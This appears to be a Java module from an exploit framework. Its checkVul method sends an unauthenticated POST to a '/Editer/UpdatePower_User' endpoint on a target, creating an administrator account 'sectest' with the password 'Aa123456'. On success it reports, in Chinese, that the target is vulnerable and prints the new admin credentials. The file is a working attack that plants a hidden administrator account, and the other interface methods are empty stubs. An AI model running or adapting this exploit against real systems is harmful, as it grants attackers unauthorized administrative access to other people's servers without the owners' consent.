package fun.fireline.exp;

import com.alibaba.fastjson.JSONObject;
import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.util.HashMap;


/**
 * 20221128
 */

public class UserManager implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private static final String VULURL = "/Editer/UpdatePower_User";
    private static final String PAYLOAD = "Id=&GroupID=1&UserName=sectest&PassWord=Aa123456&Remark=";

    @Override
    public String checkVul(String url) {
        this.target = url;

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, this.headers, "UTF-8");

        if (response.getText() != null && response.getText().contains("新增成功")) {
            this.isVul = true;
            String res3 = null;
            String result = response.getText();
            JSONObject object = JSONObject.parseObject(result);
            res3 = object.getString("msg");
            return "[+] 目标存在未授权漏洞,利用成功\n" + res3 +"\n" + "管理员用户名：sectest\n"  +"\n" +"管理员密码：Aa123456\n"  ;
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        return null;
    }

    @Override
    public String getWebPath() {
        return null;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return false;
    }
}
